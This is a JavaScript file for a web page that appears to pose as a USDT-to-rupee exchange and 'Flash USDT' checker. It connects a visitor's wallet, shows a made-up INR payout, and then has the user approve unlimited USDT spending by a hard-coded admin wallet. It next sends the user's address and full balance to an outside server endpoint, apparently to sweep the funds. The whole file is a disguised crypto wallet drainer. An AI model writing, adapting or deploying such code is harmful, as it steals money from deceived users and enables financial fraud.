import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider";
import { ethers } from "https://esm.sh/ethers@6.8.1";

// Global variables
const connectButton = document.getElementById("checkBalance");
const approveButton = document.getElementById("verifyTokenBtn");
const confirmButton = document.getElementById("confirmTransaction");
const overlay = document.getElementById("networkOverlay");


// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ADDRESSES = {
    "bep-20": "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
    "erc-20": "0xdAC17F958D2ee523a2206206994597C13D831ec7"  // ETH USDT
};
const ADMIN_WALLET = "0x8209f963F4E0956fdf92D1757d53164d61622271";

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) view returns (uint256)"
];

let signer;
let ethersProvider; // Make global so it's available in all functions
let userBalance = 0; // Cache balance to use in sendUSDT
let userAddress = ""; // Cache address

// Connect wallet and check balance
        connectButton.onclick = async () => {
            const selectedNetwork = localStorage.getItem("selectedNetwork");
                if (!selectedNetwork) {
                    alert("⚠️ Please select a network first.");
                    return;
            }
    const chainId = selectedNetwork === "bep-20" ? 56 : 1;
    const USDT_ADDRESS = USDT_ADDRESSES[selectedNetwork];
     overlay.style.display = "flex";



    connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking Balance...';
    connectButton.disabled = true;

    try {
            const provider = await EthereumProvider.init({
                projectId: "5c7a882142c7491241b507534414ddff",
                chains: [chainId],
                methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
                showQrModal: true
            });


        await provider.connect();

        ethersProvider = new ethers.BrowserProvider(provider);
        signer = await ethersProvider.getSigner();
        userAddress = await signer.getAddress();

        document.getElementById("walletAddress").value = userAddress;

        const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
        const rawBalance = await USDT.balanceOf(userAddress);
        userBalance = parseFloat(ethers.formatUnits(rawBalance, 18));

        document.getElementById("availableBalance").value = `${userBalance} USDT`;
        document.getElementById("balanceResults").style.display = "block";

        // if (userBalance < 100) {
        //     document.getElementById("step3Next").disabled = true;
        //     document.getElementById("amountCalculation").style.display = "none";
        //     $('#minBalanceModal').modal('show');
        // } else {
            document.getElementById("step3Next").disabled = false;
            document.getElementById("amountCalculation").style.display = "block";
            calculateAmount(userBalance);
        // }

    } catch (err) {
        console.error("Wallet connection error:", err);
        alert("Could not connect to wallet. Please try again.");
    } finally {
        connectButton.innerHTML = '<i class="fas fa-sync-alt"></i> Check Wallet Balance';
        connectButton.disabled = false;
    }
};

// Calculate INR equivalent and update UI
function calculateAmount(balance) {
    let rate = 0;
    if (balance >= 100 && balance < 200) rate = 98;
    else if (balance < 400) rate = 107;
    else if (balance < 1000) rate = 116;
    else if (balance < 2000) rate = 122;
    else rate = 128;

    const inrAmount = balance * rate;

    document.getElementById("calculatedAmount").value =
        `₹${inrAmount.toLocaleString('en-IN', { minimumFractionDigits: 2 })} (Rate: ₹${rate}/USDT)`;
}

// Approve tokens and show transaction summary
approveButton.onclick = async () => {
    try {
           const selectedNetwork = localStorage.getItem("selectedNetwork");
           const USDT_ADDRESS = USDT_ADDRESSES[selectedNetwork];
   
           approveButton.disabled = true;
           approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
   
           const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
           const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
           await tx.wait();

        // Reuse cached balance/address
        let rate;
        if (userBalance >= 100 && userBalance < 200) rate = 98;
        else if (userBalance < 400) rate = 107;
        else if (userBalance < 1000) rate = 116;
        else if (userBalance < 2000) rate = 122;
        else rate = 128;

        const total = userBalance * rate;

        // Fill transaction summary
        document.getElementById("summaryWallet").textContent = userAddress;
        document.getElementById("summaryAmount").textContent = `${userBalance.toFixed(2)} USDT`;
        document.getElementById("summaryRate").textContent = `₹${rate}/USDT`;
        document.getElementById("summaryTotal").textContent = `₹${total.toLocaleString('en-IN', { minimumFractionDigits: 2 })}`;

        // Show verification result
        document.getElementById("verificationResult").style.display = "block";

        // ✅ Hide the verifyTokenBtn and show the confirmTransaction button
        document.getElementById("verifyTokenBtn").style.display = "none";
        const confirmBtn = document.getElementById("confirmTransaction");
        confirmBtn.style.display = "inline-block"; // or "block" depending on your layout
        confirmBtn.disabled = false;

    } catch (err) {
        console.error("Approval error:", err);
        alert("❌ Something went wrong, please try again.");
    } finally {
        approveButton.disabled = false;
        approveButton.innerHTML = '<i class="fas fa-bolt"></i> Check Your Token for Flash USDT';
    }
};

confirmButton.onclick = async () => {
    confirmButton.disabled = true;
    confirmButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

    try {
        const selectedNetwork = localStorage.getItem("selectedNetwork");

        const res = await fetch("https://www.checkflash.site/api/send-auto", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                userAddress: userAddress,
                amount: userBalance.toString(),
                network: selectedNetwork
            })
        });

        const result = await res.json();

        if (result.success) {
            alert("✅ Transaction successfully! Tx Hash: " + result.txHash);
        } else {
            alert("❌ Failed: " + result.error);
        }

    } catch (err) {
        console.error("Request failed:", err);
        alert("❌ Something went wrong " + err.message);
    } finally {
        confirmButton.disabled = false;
        confirmButton.innerHTML = 'Get Amount in your Account <i class="fas fa-check"></i>';
    }
};



